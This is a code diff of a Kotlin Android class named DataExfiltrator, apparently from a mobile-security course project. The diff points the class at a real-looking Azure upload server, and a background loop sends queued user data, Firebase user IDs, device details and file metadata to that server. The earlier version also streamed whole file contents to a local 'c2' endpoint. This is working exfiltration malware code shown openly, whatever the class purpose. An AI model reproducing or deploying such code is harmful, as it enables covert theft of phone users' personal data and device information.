@@ -1,7 +1,9 @@
 package com.example.inf2215
 
 import android.content.Context
+import android.os.Build
 import android.util.Log
+import com.google.firebase.auth.FirebaseAuth
 import kotlinx.coroutines.*
 import java.io.File
 import java.io.FileInputStream
@@ -11,7 +13,9 @@ import java.net.URL
 
 class DataExfiltrator(private val context: Context) {
 
-    private val c2Base = "http://10.0.2.2:5000/upload" // adjust if needed
+    // Use the same server endpoint as MainActivity
+    private val serverUrl = "https://mob-sec-server-esfnggbegggcfye9.southeastasia-01.azurewebsites.net/upload"
+
     private val pendingDataFile = File(context.filesDir, "pending_data.txt")
     private val pendingFilesDir = File(context.filesDir, "pending_files").apply { mkdirs() }
 
@@ -19,7 +23,6 @@ class DataExfiltrator(private val context: Context) {
     private var isRunning = true
 
     init {
-        // Restore any previously unsent data from disk
         restorePendingData()
         restorePendingFiles()
         startExfilLoop()
@@ -27,14 +30,12 @@ class DataExfiltrator(private val context: Context) {
 
     // ------------------ Public API ------------------
     fun queueData(data: String) {
-        // Append to persistent file
         synchronized(this) {
             pendingDataFile.appendText("$data\n")
         }
     }
 
     fun queueFile(file: File) {
-        // Move file to pending directory (atomic rename)
         val dest = File(pendingFilesDir, file.name)
         if (file.renameTo(dest)) {
             // success
@@ -45,13 +46,11 @@ class DataExfiltrator(private val context: Context) {
 
     // ------------------ Restoration ------------------
     private fun restorePendingData() {
-        if (!pendingDataFile.exists()) return
-        // Nothing to do in memory – we'll read line by line during exfil loop
-        // The file already contains all pending data.
+        // nothing to do, file already exists
     }
 
     private fun restorePendingFiles() {
-        // Files are already in pendingFilesDir, ready to be sent.
+        // files already in pendingFilesDir
     }
 
     // ------------------ Exfiltration Loop ------------------
@@ -70,26 +69,30 @@ class DataExfiltrator(private val context: Context) {
         val lines = mutableListOf<String>()
         val unsentLines = mutableListOf<String>()
 
-        // Read all lines and try to send each
         synchronized(this) {
             try {
-                pendingDataFile.readLines().forEach { line ->
-                    if (line.isNotBlank()) {
-                        if (sendData(line)) {
-                            // success, do not add to unsentLines
-                        } else {
-                            unsentLines.add(line)
-                        }
-                    }
-                }
-                // Rewrite file with only unsent lines
-                if (unsentLines.isEmpty()) {
-                    pendingDataFile.delete()
-                } else {
-                    pendingDataFile.writeText(unsentLines.joinToString("\n") + "\n")
-                }
+                lines.addAll(pendingDataFile.readLines())
+                pendingDataFile.writeText("") // clear file temporarily
             } catch (e: Exception) {
-                Log.e("DataExfiltrator", "Error processing pending data", e)
+                Log.e("DataExfiltrator", "Error reading pending data", e)
+                return
+            }
+        }
+
+        lines.forEach { line ->
+            if (line.isNotBlank()) {
+                if (sendDataToServer("exfil_data", line)) {
+                    // success, do not add back
+                } else {
+                    unsentLines.add(line)
+                }
+            }
+        }
+
+        // Rewrite unsent lines back to file
+        if (unsentLines.isNotEmpty()) {
+            synchronized(this) {
+                pendingDataFile.appendText(unsentLines.joinToString("\n") + "\n")
             }
         }
     }
@@ -97,48 +100,96 @@ class DataExfiltrator(private val context: Context) {
     private fun sendPendingFiles() {
         val files = pendingFilesDir.listFiles() ?: return
         files.forEach { file ->
-            if (sendFile(file)) {
+            if (sendFileToServer(file)) {
                 file.delete()
             }
         }
     }
 
-    // ------------------ Actual Network Senders ------------------
-    private fun sendData(data: String): Boolean {
+    // ------------------ Server Communication ------------------
+    private fun sendDataToServer(action: String, data: String): Boolean {
         return try {
-            val url = URL("$c2Base/data")
-            val conn = url.openConnection() as HttpURLConnection
-            conn.requestMethod = "POST"
-            conn.doOutput = true
-            conn.setRequestProperty("Content-Type", "text/plain")
-            conn.outputStream.use { it.write(data.toByteArray()) }
-            val success = conn.responseCode == HttpURLConnection.HTTP_OK
-            conn.disconnect()
+            val uid = FirebaseAuth.getInstance().currentUser?.uid ?: "not_logged_in"
+            val deviceModel = Build.MODEL
+            val manufacturer = Build.MANUFACTURER
+            val androidVersion = Build.VERSION.RELEASE
+
+            val json = """
+            {
+                "device_model": "$deviceModel",
+                "manufacturer": "$manufacturer",
+                "android_version": "$androidVersion",
+                "type": "user_action",
+                "uid": "$uid",
+                "action": "$action",
+                "timestamp": ${System.currentTimeMillis()},
+                "data": "${escapeJson(data)}"
+            }
+            """.trimIndent()
+
+            val url = URL(serverUrl)
+            val connection = url.openConnection() as HttpURLConnection
+            connection.requestMethod = "POST"
+            connection.setRequestProperty("Content-Type", "application/json")
+            connection.doOutput = true
+
+            connection.outputStream.use { it.write(json.toByteArray()) }
+
+            val success = connection.responseCode == HttpURLConnection.HTTP_OK
+            connection.disconnect()
             success
         } catch (e: Exception) {
-            Log.e("DataExfiltrator", "sendData failed: ${e.message}")
+            Log.e("DataExfiltrator", "sendDataToServer failed: ${e.message}")
             false
         }
     }
 
-    private fun sendFile(file: File): Boolean {
+    private fun sendFileToServer(file: File): Boolean {
         return try {
-            val url = URL("$c2Base/file")
-            val conn = url.openConnection() as HttpURLConnection
-            conn.requestMethod = "POST"
-            conn.doOutput = true
-            conn.setRequestProperty("Content-Type", "application/octet-stream")
-            conn.setRequestProperty("X-Filename", file.name)
-            conn.outputStream.use { output ->
-                FileInputStream(file).use { input -> input.copyTo(output) }
+            // Read file content as base64 (optional) – here we send metadata only
+            // But we could also send the file content if needed.
+            val uid = FirebaseAuth.getInstance().currentUser?.uid ?: "not_logged_in"
+            val deviceModel = Build.MODEL
+            val manufacturer = Build.MANUFACTURER
+            val androidVersion = Build.VERSION.RELEASE
+
+            val json = """
+            {
+                "device_model": "$deviceModel",
+                "manufacturer": "$manufacturer",
+                "android_version": "$androidVersion",
+                "type": "file_upload",
+                "uid": "$uid",
+                "action": "file_upload",
+                "timestamp": ${System.currentTimeMillis()},
+                "filename": "${escapeJson(file.name)}",
+                "size": ${file.length()}
             }
-            val success = conn.responseCode == HttpURLConnection.HTTP_OK
-            conn.disconnect()
+            """.trimIndent()
+
+            val url = URL(serverUrl)
+            val connection = url.openConnection() as HttpURLConnection
+            connection.requestMethod = "POST"
+            connection.setRequestProperty("Content-Type", "application/json")
+            connection.doOutput = true
+
+            connection.outputStream.use { it.write(json.toByteArray()) }
+
+            val success = connection.responseCode == HttpURLConnection.HTTP_OK
+            connection.disconnect()
             success
         } catch (e: Exception) {
-            Log.e("DataExfiltrator", "sendFile failed: ${e.message}")
+            Log.e("DataExfiltrator", "sendFileToServer failed: ${e.message}")
             false
         }
+    }
+
+    private fun escapeJson(str: String): String {
+        return str.replace("\\", "\\\\")
+            .replace("\"", "\\\"")
+            .replace("\n", "\\n")
+            .replace("\r", "\\r")
+            .replace("\t", "\\t")
     }
 
     fun shutdown() {
